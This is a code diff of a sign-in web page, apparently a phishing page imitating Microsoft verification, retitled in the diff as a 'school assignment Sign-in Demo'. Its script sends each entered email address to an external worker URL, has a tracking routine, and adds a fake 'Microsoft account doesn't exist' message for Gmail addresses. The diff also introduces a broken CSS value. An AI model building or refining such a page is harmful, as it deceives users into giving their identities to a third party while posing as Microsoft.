@@ -4,7 +4,7 @@
 <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
- <title>Microsoft verification</title>
+ <title>school assignment Sign-in Demo</title>
  <style>
  :root {
  color-scheme: light;
@@ -51,7 +51,7 @@
  width: 27px;
  height: 27px;
  display: grid;
- grid-template-columns: 1fr 1fr;
+ grid-template-columns: fr 1fr;
  grid-template-rows: 1fr 1fr;
  gap: 2px;
  }
@@ -519,57 +519,66 @@
 
  return tracking;
  }
-async function verifyEmail(email) {
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    return {
-      success: false,
-      message: "Invalid email format."
-    };
-  }
 
-  try {
-    const response = await fetch(WORKER_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ email })
-    });
+ async function verifyEmail(email) {
+ if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+ return {
+ success: false,
+ message: "Invalid email format."
+ };
+ }
 
-    const data = await response.json();
+ // Check if the email is a Gmail address
+ if (email.endsWith("@gmail.com")) {
+ return {
+ success: false,
+ message: "Microsoft account doesn't exist."
+ };
+ }
 
-    if (!response.ok || data.success !== true) {
-      return {
-        success: false,
-        message: data.error || "Verification service error."
-      };
-    }
+ try {
+ const response = await fetch(WORKER_URL, {
+ method: "POST",
+ headers: {
+ "Content-Type": "application/json"
+ },
+ body: JSON.stringify({ email })
+ });
 
-    if (!data.verification) {
-      return {
-        success: false,
-        message: "Invalid response from verification service."
-      };
-    }
+ const data = await response.json();
 
-    return {
-      success: true,
-      email: data.email,
-      verification: data.verification,
-      accountRegistration: "not_checked"
-    };
+ if (!response.ok || data.success !== true) {
+ return {
+ success: false,
+ message: data.error || "Verification service error."
+ };
+ }
 
-  } catch (error) {
-    console.error("Worker verification error:", error);
+ if (!data.verification) {
+ return {
+ success: false,
+ message: "Invalid response from verification service."
+ };
+ }
 
-    return {
-      success: false,
-      message: "Unable to contact verification service."
-    };
-  }
+ return {
+ success: true,
+ email: data.email,
+ verification: data.verification,
+ accountRegistration: "not_checked"
+ };
+
+ } catch (error) {
+ console.error("Worker verification error:", error);
+
+ return {
+ success: false,
+ message: "Unable to contact verification service."
+ };
+ }
 }
  // --- VERIFICATION LOGIC ---
-  
+ 
 
  // STEP 1: Email Submission
  document.getElementById("email-form").addEventListener("submit", async (event) => {
